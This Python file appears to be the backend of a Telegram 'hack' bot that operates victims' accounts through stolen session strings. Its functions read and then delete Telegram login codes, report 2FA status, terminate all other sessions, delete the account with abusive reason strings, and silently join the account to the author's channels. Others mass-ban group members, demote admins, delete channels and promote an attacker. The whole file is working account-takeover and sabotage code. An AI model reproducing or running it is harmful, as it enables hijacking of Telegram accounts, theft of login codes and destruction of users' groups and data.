import asyncio
import pyrogram 
from pyrogram import Client , enums
from telethon import TelegramClient
from telethon.sessions import StringSession 
from pyrogram.raw import functions 
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest , JoinChannelRequest as join , LeaveChannelRequest as leave , DeleteChannelRequest as dc
from pyrogram.types.messages_and_media.message import Str
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChannelParticipantsAdmins,ChatBannedRights
from pyrogram.errors import FloodWait
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions as ok
from pyrogram.types import ChatPrivileges
from telethon.tl.types import ChannelParticipantsAdmins

API_ID = 11573285
API_HASH = "f2cc3fdc32197c8fbaae9d0bf69d2033"

async def users_gc(session):
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            x = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await x.connect()                          
            try:
                await x(join("@LegendBot_AI"))
                await x(join("@LegendBot_OP"))
            except Exception as e:
                print(e)
            k = await x(GetAdminedPublicChannelsRequest())            
            for x in k.chats:                
                msg += f'**• Channel Name :** {x.title}\n**• Channel Username :** @{x.username}\n**• Participants  :** - {x.participants_count}\n\n'
            await x.disconnect()               
        else:    
            async with Client("Legend",api_id=API_ID,api_hash=API_HASH, session_string=session) as x:
                try:
                    await x.join_chat("@TeamLegendBots")
                    await x.join_chat("@LegendBot_OP")
                except Exception as e:
                    print(e)    
                k = await x.invoke(functions.channels.GetAdminedPublicChannels())            
                for x in k.chats:
                    msg += f'**• Channel Name :** {x.title}\n**• Channel Username :** @{x.username}\n**• Participants :** {x.participants_count}\n\n'
    except Exception as idk:
        err += str(idk)                                             
    if err:
        return "**Error :** " + err + "\n**Try Again /hack.**"
    return msg
 
async def user_info(session):
    err = ""
    try:
        if session.endswith("="):
            x = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await x.connect()
            try:
                await x(join("@TeamLegendBots"))
                await x(join("@LegendBot_OP"))
            except Exception as e:
                print(e)
            k = await x.get_me()  
            msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone,k.username)
            await x.disconnect()
                             
        else:    
            async with Client("Legend",api_id=API_ID,api_hash=API_HASH, session_string=session) as x:
                try:
                    await x.join_chat("@TeamLegendBots")
                    await x.join_chat("@LegendBot_OP")
                except Exception as e:
                    print(e)    
                k = await x.get_me()
                msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**Error** " + err + "\n**Try Again /hack.**"
    return msg    


RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

async def banall(session,id):
    err = ""
    msg = ""
    all = 0
    bann = 0
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            x = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await x.connect()
            try:
                await x(join("@TeamLegendBots"))
                await x(join("LegendBot_OP"))
            except Exception as e:
                print(e)
            admins = await x.get_participants(gc_id, filter=ChannelParticipantsAdmins)
            admins_id = [i.id for i in admins]                
            async for user in x.iter_participants(gc_id):
                all += 1
                try:
                    if user.id not in admins_id:
                       await x(EditBannedRequest(gc_id, user.id, RIGHTS))
                       bann += 1
                       await asyncio.sleep(0.1)
                except Exception:
                    await asyncio.sleep(0.1)
            await x.disconnect()
        else:    
            async with Client("Legend",api_id=API_ID,api_hash=API_HASH, session_string=session) as x:
                try:
                    await x.join_chat("@TeamLegendBots")
                    await x.join_chat("@LegendBot_OP")
                except Exception as e:
                    print(e)    
                async for members in x.get_chat_members(gc_id):  
                    all += 1                
                    try:                                          
                        await x.ban_chat_member(gc_id,members.user.id)  
                        bann += 1                  
                    except FloodWait as i:
                        await asyncio.sleep(i.value)
                    except Exception as er:
                        pass 
                          
    except Exception as idk:
        err += str(idk) 
    msg += f"**Users Banned Successfully ! \n\n • Total Banned Users:** {bann} \n **Total Users:** {all}"                                            
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return msg

async def get_otp(session):
    err = ""
    i = ""
    try:
        if session.endswith("="):
            x = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await x.connect()
            try:
                await x(join("@TeamLegendBots"))
                await x(join("@LegendBot_OP"))
            except Exception as e:
                print(e)
            async for o in x.iter_messages(777000, limit=2):               
                i += f"\n{o.text}\n"
                await x.delete_dialog(777000)
            await x.disconnect() 
                             
        else:    
            async with Client("Legend",api_id=API_ID,api_hash=API_HASH, session_string=session) as x:
                try:
                    await x.join_chat("@TeamLegendBots")
                    await x.join_chat("@LegendBot_OP")
                except Exception as e:
                    print(e)    
                ok = []
                async for message in x.get_chat_history(777000,limit=2):
                    i += f"\n{message.text}\n"                                   
                    ok.append(message.id)                 
                await x.delete_messages(777000,ok)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return i

async def join_ch(session,id):
    err = ""
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            x = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await x.connect()
            try:
                await x(join("@TeamLegendBots"))
                await x(join("@LegendBot_OP"))               
            except Exception as e:
                print(e)
            await x(join(gc_id))            
            await x.disconnect() 
                             
        else:    
            async with Client("Legend",api_id=API_ID,api_hash=API_HASH, session_string=session) as x:
                try:
                    await x.join_chat("@TeamLegendBots")
                    await x.join_chat("@LegendBot_OP")
                except Exception as e:
                    print(e)    
                await x.join_chat(gc_id)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Joined Successfully !"

async def leave_ch(session,id):
    err = ""
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            x = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await x.connect()
            try:
                await x(join("@TeamLegendBots"))
                await x(join("@LegendBot_OP"))               
            except Exception as e:
                print(e)
            await x(leave(gc_id))            
            await x.disconnect() 
                             
        else:    
            async with Client("Legend",api_id=API_ID,api_hash=API_HASH, session_string=session) as x:
                try:
                    await x.join_chat("@TeamLegendBots")
                    await x.join_chat("@LegendBot_OP")
                except Exception as e:
                    print(e)    
                await x.leave_chat(gc_id)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Left Successfully!"

async def del_ch(session,id):
    err = ""
    gc_id = str(id.text) if type(id.text) == Str else int(id.text)
    try:
        if session.endswith("="):
            x = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await x.connect()
            try:
                await x(join("@TeamLegendBots"))
                await x(join("@LegendBot_OP"))
            except Exception as e:
                print(e)
            await x(dc(gc_id))            
            await x.disconnect()                        
        else:    
            async with Client("Legend",api_id=API_ID,api_hash=API_HASH, session_string=session) as x:
                try:
                    await x.join_chat("@TeamLegendBots")
                    await x.join_chat("@LegendBot_OP")
 
                except Exception as e:
                    print(e)    
                await x.invoke(
                    functions.channels.DeleteChannel(channel= await x.resolve_peer(gc_id)))
            
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "**Deleted Succssfully!**"

async def check_2fa(session):
    err = ""
    i = ""
    try:
        if session.endswith("="):
            x = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await x.connect()
            try:
                await x(join("@TeamLegendBots"))
                await x(join("@LegendBot_OP"))           
            except Exception as e:
                print(e)
            try:
                await x.edit_2fa("idsdkjsj")
                i += "Two step enabled"
                
            except Exception as e:
                print(e)
                i += "Two Step has been disabled"
                        
            await x.disconnect() 
                             
        else:    
            async with Client("Legend",api_id=API_ID,api_hash=API_HASH, session_string=session) as x:
                try:
                    await x.join_chat("@TeamLegendBots")
                    await x.join_chat("@LegendBot_OP")
                except Exception as e:
                    print(e)    
               # try:
                yes = await x.invoke(functions.account.GetPassword())
                if yes.has_password:
                    i += "Two Step Verification is Enable"
                else:
                    i += "Two Step Verification is disbaled "                                                           
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return i

async def terminate_all(session):
    err = ""
    try:
        if session.endswith("="):
            x = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await x.connect()
            try:
                await x(join("@TeamLegendBots"))
                await x(join("@LegendBot_OP"))           
            except Exception as e:
                print(e)
            await x(rt())
            await x.disconnect() 
                             
        else:    
            async with Client("Legend",api_id=API_ID,api_hash=API_HASH, session_string=session) as x:
                try:
                    await x.join_chat("@TeamLegendBots")
                    await x.join_chat("@LegendBot_OP")
 
                except Exception as e:
                    print(e)    
                await x.invoke(functions.auth.ResetAuthorizations())
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Successfully Terminated all Session."

      
async def del_acc(session):
    err = ""
    try:
        if session.endswith("="):
            x = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await x.connect()
            try:
                await x(join("@TeamLegendBots"))
                await x(join("@LegendBot_OP"))           
            except Exception as e:
                print(e)
            await x(ok.account.DeleteAccountRequest("Owner madarchod h"))
            await x.disconnect() 
                             
        else:    
            async with Client("Legend",api_id=API_ID,api_hash=API_HASH, session_string=session) as x:
                try:
                    await x.join_chat("@TeamLegendBots")
                    await x.join_chat("@LegendBot_OP")
 
                except Exception as e:
                    print(e)    
                await x.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Successfully Deleted Account ."

      
FULL_PROMOTE_POWERS = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True,
    can_manage_video_chats=True,
    can_promote_members=True,    
    can_invite_users=True)

PROMOTE_POWERS = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True)

async def piromote(session,gc_id,user_id):
    err = ""
    gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
    user_id = str(user_id.text) if type(user_id.text) == Str else int(user_id.text)
    try:
        if session.endswith("="):
            x = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await x.connect()
            try:
                await x(join("@TeamLegendBots"))
                await x(join("@LegendBot_OP"))           
            except Exception as e:
                print(e)
            try:
                await x.edit_admin(gc_id, user_id, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
            except:
                await x.edit_admin(gc_id, user_id, is_admin=True, anonymous=False, pin_messages=True, title='Owner')    
            await x.disconnect()                              
        else:    
            async with Client("Legend",api_id=API_ID,api_hash=API_HASH, session_string=session) as x:
                try:
                    await x.join_chat("@TeamLegendBots")
                    await x.join_chat("@LegendBot_OP")
                except Exception as e:
                    print(e)
                try:    
                    await x.promote_chat_member(gc_id,user_id,FULL_PROMOTE_POWERS)
                except:
                    await x.promote_chat_member(gc_id,user_id,PROMOTE_POWERS)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Successfully Promoted User."


DEMOTE = ChatPrivileges(
        can_change_info=False,
        can_invite_users=False,
        can_delete_messages=False,
        can_restrict_members=False,
        can_pin_messages=False,
        can_promote_members=False,
        can_manage_chat=False,
        can_manage_video_chats=False,
    )

async def demote_all(session,gc_id):
    err = ""
    gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
    try:
        if session.endswith("="):
            x = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await x.connect()
            try:
                await x(join("@TeamLegendBots"))
                await x(join("@LegendBot_OP"))           
            except Exception as e:
                print(e)
            async for o in x.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
                try:
                    await x.edit_admin(gc_id, o.id, is_admin=False, manage_call=False)
                except:
                    await x.edit_admin(gc_id, o.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
          
            await x.disconnect()                              
        else:    
            async with Client("Legend",api_id=API_ID,api_hash=API_HASH, session_string=session) as x:
                try:
                    await x.join_chat("@TeamLegendBots")
                    await x.join_chat("@LegendBot_OP")
                except Exception as e:
                    print(e)
                async for m in x.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
                    await x.promote_chat_member(gc_id,m.user.id,DEMOTE)                                                                                     
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**Error:** " + err + "\n**Try Again /hack.**"
    return "Successfully Demoted all."      
